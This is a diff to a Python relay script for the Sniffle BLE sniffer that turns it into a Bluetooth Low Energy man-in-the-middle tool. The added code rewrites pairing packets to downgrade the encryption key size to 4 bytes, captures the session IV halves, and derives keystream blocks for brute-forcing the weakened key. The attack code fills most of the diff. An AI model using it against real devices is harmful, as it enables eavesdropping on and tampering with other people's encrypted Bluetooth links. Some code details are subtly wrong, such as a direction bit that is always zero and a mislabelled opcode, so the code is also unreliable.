@@ -1,3 +1,4 @@
+# track encryption start on the C_r <-> P link
 #!/usr/bin/env python3
 
 # Written by Sultan Qasim Khan
@@ -7,6 +8,8 @@
 
 import argparse, sys, signal
 import serial
+import threading
+
 from binascii import unhexlify
 from queue import Queue
 from time import time
@@ -20,6 +23,9 @@ from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessag
         AdvIndMessage, AdvDirectIndMessage, ScanRspMessage, ConnectIndMessage, \
         str_mac, LlControlMessage, AdvertMessage
 from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode
+
+from mitble_help import downgrade_pairing_request, downgrade_pairing_response
+from brute_forcer import make_ble_ccm_nonce, make_ble_ccm_counter_block, ble_ccm_encrypt, ble_ccm_decrypt_verify
 
 """
 Relay attack principles:
@@ -74,8 +80,29 @@ Empty--------->
 # global variable to access hardware
 hw = None
 
-# global variable for pcap writer
+found_key = None                  
+_found_key_lock = threading.Lock()
+bruteforce_stop = threading.Event()
+bruteforce_thread = None
+
+
 pcwriter = None
+enc_start_seen = False          
+first_enc_rsp_pkt = None        
+uart_test_pending = False
+uart_last_seq = None
+
+
+link_encryption_active = False
+enc_ctr_p_to_c = 0
+enc_ctr_c_to_p = 0
+last_sn_p_to_c = None
+last_sn_c_to_p = None
+
+# IVs for building the full IV
+ivm_from_c = None   # IVm from real central C (C -> P_r, LL_ENC_REQ)
+ivs_from_p = None   # IVs from real peripheral P (P -> C_r, LL_ENC_RSP)
+iv_real_cp = None   # IVm_from_c || IVs_from_p
 
 def sigint_handler(sig, frame):
     hw.cancel_recv()
@@ -84,6 +111,8 @@ def sigint_handler(sig, frame):
     sys.exit(0)
 
 def main():
+    global uart_test_pending, uart_last_seq
+
     aparse = argparse.ArgumentParser(description="Relay master script for Sniffle BLE5 sniffer")
     aparse.add_argument("-s", "--serport", default=None, help="Sniffer serial port name")
     aparse.add_argument("-c", "--advchan", default=37, choices=[37, 38, 39], type=int,
@@ -110,8 +139,9 @@ def main():
     aparse.add_argument("--periph-baud", type=int, default=115200,
         help="Baudrate for the REAL peripheral (default: 115200)")
     args = aparse.parse_args()
-    global hw
+    global hw, periph_ser
     hw = SniffleHW(args.serport)
+    new_key_size = 0x04
 
 
     # put the hardware in a normal state (passive scanning) and configure it with an impossibly
@@ -142,6 +172,7 @@ def main():
     conn = server.accept()
     print("Got connection from", conn.peer_ip)
 
+    
     # Network latency test
     stime = time()
     conn.send_msg(MessageType.PING, b'latency_test')
@@ -186,14 +217,18 @@ def main():
 
     if args.periph_serial:
         try:
-            with serial.Serial(args.periph_serial, args.periph_baud, timeout=0.5) as ser:
-                ser.write(b'0')
-            print(f"[UART->PERIPH] Sent '0' to {args.periph_serial} (pause advertising).")
+            periph_ser = serial.Serial(
+                args.periph_serial,
+                args.periph_baud,
+                timeout=0,   # non-blocking, works well with select()
+            )
+            # e.g. send '0' to pause advertising if you still want that:
+            periph_ser.write(b'0')
+            print(f"[UART->PERIPH] Opened {periph_ser.port}, sent '0' (pause advertising).")
         except Exception as e:
-            print(f"[UART->PERIPH] WARNING: could not send '0' on {args.periph_serial}: {e}", file=sys.stderr)
-
-    if args.pause:
-        input("Press enter to continue...")
+            print(f"[UART->PERIPH] WARNING: could not open {args.periph_serial}: {e}",
+                  file=sys.stderr)
+            periph_ser = None
     conn.send_msg(MessageType.PING, b'')
 
     # relay slave will now impersonate our target
@@ -207,17 +242,17 @@ def main():
     if not isinstance(conn_req, ConnectIndMessage):
         raise ValueError("CONN_REQ was not a CONN_REQ!")
 
-    if args.periph_serial:
+    if periph_ser is not None:
         try:
-            with serial.Serial(args.periph_serial, args.periph_baud, timeout=0.5) as ser:
-                ser.write(b'1')
-            print(f"[UART->PERIPH] Sent '1' to {args.periph_serial} (resume advertising).")
+            periph_ser.write(b'1')
+            print(f"[UART->PERIPH] Sent '1' on {periph_ser.port} (resume advertising).")
         except Exception as e:
-            print(f"[UART->PERIPH] WARNING: could not send '1' on {args.periph_serial}: {e}", file=sys.stderr)
+            print(f"[UART->PERIPH] WARNING: could not send '1' on {periph_ser.port}: {e}",
+                file=sys.stderr)
 
     print("Relay slave notified us of connection request. Connecting to real target...")
     print(conn_req)
-
+    # Receiver = real central C (checks peripheral peer on the C<->P_r link)
     global pcwriter
     if not (args.output is None):
         pcwriter = PcapBleWriter(args.output)
@@ -280,12 +315,45 @@ def main():
     filter_changes = args.fastslave or args.fastmaster
 
     while True:
-        ready, _, _ = select([hw.ser.fd, conn.sock], [], [])
+        fds = [hw.ser.fd, conn.sock]
+        if periph_ser is not None:
+            try:
+                fds.append(periph_ser.fileno())
+            except Exception:
+                # fileno() may not exist on some platforms; then you can’t use select() on it
+                print("[UART] error using fileno()")
+                pass
+
+        ready, _, _ = select(fds, [], [])
 
         if conn.sock in ready:
-            sock_recv_print_forward(conn, args.quiet, filter_changes)
+            sock_recv_print_forward(conn, args.quiet, new_key_size, filter_changes)
+
         if hw.ser.fd in ready:
-            ser_recv_print_forward(conn, args.quiet, filter_changes)
+            ser_recv_print_forward(conn, args.quiet, new_key_size, filter_changes)
+
+        if periph_ser is not None:
+            try:
+                fd = periph_ser.fileno()
+            except Exception:
+                fd = None
+
+            if fd is not None and fd in ready:
+                line = periph_ser.readline()
+                if line:
+                    print(f"[UART_PERIPH] got line: {line!r}")
+                    if line.startswith(b'B'):
+                        parts = line.split()
+                        if len(parts) >= 2:
+                            try:
+                                seq = int(parts[1])
+                                print(f"[UART_PERIPH] test notification seq={seq}")
+                                uart_test_pending = True
+                                print(f"[UART_PERIPH] status uart_test_pending: {uart_test_pending}")
+                                uart_last_seq = seq
+                            except ValueError:
+                                print(f"[UART_PERIPH] could not parse seq from {line!r}")
+
 
 def has_instant(pkt):
     return isinstance(pkt, LlControlMessage) and pkt.opcode in [0x00, 0x01, 0x18]
@@ -293,36 +361,187 @@ def has_instant(pkt):
 def is_param_req(pkt):
     return isinstance(pkt, LlControlMessage) and pkt.opcode == 0x0F
 
-def sock_recv_print_forward(conn, quiet, filter_changes=False):
-    # receive packets from relay slave and retransmit them here
-    mtype, body = conn.recv_msg()
-    if mtype != MessageType.PACKET:
-        return
-    event, = unpack('<H', body[:2])
-    body = body[2:]
-    llid = body[0] & 3
-    pdu = body[2:]
+def _hex_bytes(b: bytes) -> str:
+    return " ".join(f"{x:02x}" for x in b)
 
-    # construct packet object for display and PCAP
-    pkt = DPacketMessage.from_body(body, True)
-    pkt.ts_epoch = time()
-    pkt.ts = pkt.ts_epoch - hw.decoder_state.first_epoch_time
-    pkt.aa = hw.decoder_state.cur_aa
-    pkt.event = event
+def _hx(b: bytes) -> str:
+    return ''.join(f'{x:02x}' for x in b)
 
-    # Passing on PDUs with instants in the past would break the connection
-    if not (filter_changes and has_instant(pkt)):
-        hw.cmd_transmit(llid, pdu, event)
-    print_message(pkt, quiet)
+def _extract_smp_key_size_from_ll_body(ll_body: bytes):
+    """
+    Returns smp_code and key_size for SMP Pairing Req/Rsp,
+    """
+    if len(ll_body) < 4:
+        return (None, None)
+    llid = ll_body[0] & 0x03
+    length = ll_body[1]
+    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
+        return (None, None)
+    l2cap = ll_body[2:2+length]
+    if len(l2cap) < 7:
+        return (None, None)
+    l2len = l2cap[0] | (l2cap[1] << 8)
+    cid   = l2cap[2] | (l2cap[3] << 8)
+    if cid != 0x0006 or len(l2cap) < 4 + l2len or l2len < 7:
+        return (None, None)
+    smp = l2cap[4:4+l2len]
+    smp_code = smp[0]
+    if smp_code not in (0x01, 0x02):  
+        return (None, None)
+    return (smp_code, smp[4])
 
-def ser_recv_print_forward(conn, quiet, filter_changes=False):
+
+def _extract_ivm_from_ll_enc_req(ctrl: LlControlMessage):
+    """
+    LL_ENC_REQ (0x03), length 23, just take the last 4 bytes.
+    """
+    body = ctrl.body
+    if ctrl.opcode != 0x03 or len(body) < 23:
+        return None
+    return body[-4:]  # bytes 19..22
+
+
+def _extract_ivs_from_ll_enc_rsp(ctrl: LlControlMessage):
+    """
+    LL_ENC_RSP (0x04), length 3, just take the last 4 bytes.
+    """
+    body = ctrl.body
+    if ctrl.opcode != 0x04 or len(body) < 13:
+        return None
+    return body[-4:]  # bytes 9..12
+
+
+def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
+    global enc_start_seen, first_enc_rsp_pkt
+    global ivm_from_c, ivs_from_p, iv_real_cp
+    global uart_test_pending, uart_last_seq
+    global link_encryption_active, enc_ctr_p_to_c, enc_ctr_c_to_p
+    global last_sn_p_to_c, last_sn_c_to_p
+
     msg = hw.recv_and_decode()
 
     if isinstance(msg, PacketMessage):
         msg = DPacketMessage.decode(msg)
-        # only forward non-empty data
+        # only forward non-empty data (for printing / forwarding decisions)
         empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
         block_req = filter_changes and is_param_req(msg)
+
+        # LL_START_ENC_REQ (opcode 0x05) on this link, packetCounters are reset.
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x05:
+            link_encryption_active = True
+            enc_ctr_p_to_c = 0
+            enc_ctr_c_to_p = 0
+            last_sn_p_to_c = None
+            last_sn_c_to_p = None
+            print("Saw LL_START_ENC_RSP on real, packetCounters starts at 0")
+
+
+        if isinstance(msg, DataMessage):
+            # data_dir to indicate direction:
+            #   1 = slave -> master (P -> C_r)
+            #   0 = master -> slave (C_r -> P)
+            data_dir = getattr(msg, "data_dir", 0)
+            #print("Data direction is: ", data_dir)
+            pdu = msg.body
+            if len(pdu) < 2:
+                print("Data PDU too short for header")
+                packet_counter = None
+            else:
+                hdr0 = pdu[0]
+                # SN is bit 2 of the LL data header, necessary to detect retransmission of PDU
+                sn_bit = (hdr0 >> 2) & 0x01 
+
+                packet_counter = None
+                if link_encryption_active:
+                    print(f"State of uart: {uart_test_pending}")
+                    if data_dir == 1:
+                        if last_sn_p_to_c is None or sn_bit != last_sn_p_to_c:
+                            packet_counter = enc_ctr_p_to_c
+                            enc_ctr_p_to_c += 1
+                            last_sn_p_to_c = sn_bit
+                            print(f"P->C_r NEW encrypted PDU, packetCounter={packet_counter}")
+                        else:
+                            print("P->C_r retransmit (SN unchanged) – not incrementing counter")
+                    else:
+                        if last_sn_c_to_p is None or sn_bit != last_sn_c_to_p:
+                            packet_counter = enc_ctr_c_to_p
+                            enc_ctr_c_to_p += 1
+                            last_sn_c_to_p = sn_bit
+                            print(f"C_r->P NEW encrypted PDU, packetCounter={packet_counter}")
+                        else:
+                            print("C_r->P retransmit (SN unchanged) – not incrementing counter")
+
+            #direction bit is opposite of data direction used by sniffle, like very logical 
+            direction_bit = 0 if data_dir == 1 else 0
+
+
+
+            if uart_test_pending and not empty and data_dir == 1:
+                print("Encrypted packet will be sent by P!")
+                uart_test_pending = False
+
+                if packet_counter is not None:
+                    print(f"This PDU has packetCounter={packet_counter}")
+
+                if len(pdu) < 2:
+                    print(f"ERROR: PDU too short for header (len={len(pdu)})")
+                    return
+
+                hdr0 = pdu[0]          # LL data header first octet
+                length = pdu[1]        # length
+                payload = pdu[2:2 + length] #MIC and payload, both encrypted
+
+
+                MIC_LEN = 4
+                if len(payload) <= MIC_LEN:
+                    print(f"ERROR: payload too short for data+MIC (len={len(payload)})")
+                    return
+
+                ciphertext = payload[:-MIC_LEN]
+                mic_on_air = payload[-MIC_LEN:]
+
+                VALUE_LEN = 16
+                if len(ciphertext) < VALUE_LEN:
+                    print(f"ERROR: packet too short")
+                    return
+
+                print(f"ciphertext: {_hx(ciphertext)}")
+                print(f"MIC (encrypted): {_hx(mic_on_air)}")
+
+
+                if iv_real_cp is not None and packet_counter is not None:
+                    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter, direction_bit)
+                    a0 = make_ble_ccm_counter_block(nonce, block_index=1)
+                    plaintext_test = bytes([0x42, uart_last_seq] + [0xA5] * 14)
+                    ciphertext_test = ciphertext[-VALUE_LEN:]
+                    keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
+                    print(f"       Plaintext for HULK: {_hx(a0)}")
+                    print(f"       Ciphertext for HULK: {_hx(keystream)}")
+
+        # LL_ENC_RSP from P to extract IV
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x04:
+            ivs = _extract_ivs_from_ll_enc_rsp(msg)
+            if ivs is not None:
+                ivs_from_p = ivs
+                print(f"[IV] IVs from real peripheral (LL_ENC_RSP on P->C_r): {_hx(ivs_from_p)}")
+
+            if ivm_from_c is not None and ivs_from_p is not None and iv_real_cp is None:
+                iv_real_cp = ivm_from_c + ivs_from_p
+                print(f"[IV] Combined real C<->P IV (IVm||IVs): {_hx(iv_real_cp)}")
+
+        # Downgrade entropy (max key size parameter)
+        if not empty and not block_req and isinstance(msg, DataMessage):
+            old_body = msg.body
+            new_ll, changed = downgrade_pairing_request(old_body, new_key_size)
+            if changed:
+                old_code, old_ks = _extract_smp_key_size_from_ll_body(old_body)
+                new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
+                code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")
+                print(f"[DOWNGRADE] {code_name}: key size {old_ks} -> {new_ks}")
+                print(f"  old LL body ({len(old_body)} bytes): {_hex_bytes(old_body)}")
+                print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
+                msg.body = new_ll
+
         if not empty and not block_req:
             # Forward packets to the relay slave
             conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
@@ -331,6 +550,64 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False):
             hw.cmd_transmit(3, b'\x11\x0F\x3B')
 
     print_message(msg, quiet)
+
+
+
+def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
+    global enc_start_seen, first_enc_rsp_pkt
+    global ivm_from_c, ivs_from_p, iv_real_cp
+    global uart_test_pending, uart_last_seq
+
+    # receive packets from relay slave and retransmit them here
+    mtype, body = conn.recv_msg()
+    if mtype != MessageType.PACKET:
+        return
+
+    old_packet = body
+
+    # Downgrade entropy (max key size parameter)
+    new_packet, changed = downgrade_pairing_response(body, new_key_size)
+    body = new_packet
+    if changed:
+        old_ll = old_packet[2:]
+        new_ll = new_packet[2:]
+
+        old_code, old_ks = _extract_smp_key_size_from_ll_body(old_ll)
+        new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
+        code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")
+
+        print(f"[DOWNGRADE] {code_name} (from peripheral): key size {old_ks} -> {new_ks}")
+        print(f"  old LL body ({len(old_ll)} bytes): {_hex_bytes(old_ll)}")
+        print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
+
+    
+    event, = unpack('<H', body[:2])
+    body = body[2:]
+    llid = body[0] & 3
+    pdu = body[2:]
+    # construct packet object for display and PCAP
+    pkt = DPacketMessage.from_body(body, True)
+    pkt.ts_epoch = time()
+    pkt.ts = pkt.ts_epoch - hw.decoder_state.first_epoch_time
+    pkt.aa = hw.decoder_state.cur_aa
+    pkt.event = event
+
+    # LL_ENC_REQ from P to extract IV
+    if isinstance(pkt, LlControlMessage) and pkt.opcode == 0x03:
+        ivm = _extract_ivm_from_ll_enc_req(pkt)
+        if ivm is not None:
+            ivm_from_c = ivm
+            print(f"[IV] IVm from real central (LL_ENC_REQ on C->P_r): {_hx(ivm_from_c)}")
+
+        if ivm_from_c is not None and ivs_from_p is not None and iv_real_cp is None:
+            iv_real_cp = ivm_from_c + ivs_from_p
+            print(f"[IV] Combined real C<->P IV (IVm||IVs): {_hx(iv_real_cp)}")
+
+    # Passing on PDUs with instants in the past would break the connection
+    if not (filter_changes and has_instant(pkt)):
+        hw.cmd_transmit(llid, pdu, event)
+    print_message(pkt, quiet)
+
 
 def print_message(msg, quiet=False):
     if isinstance(msg, DPacketMessage):
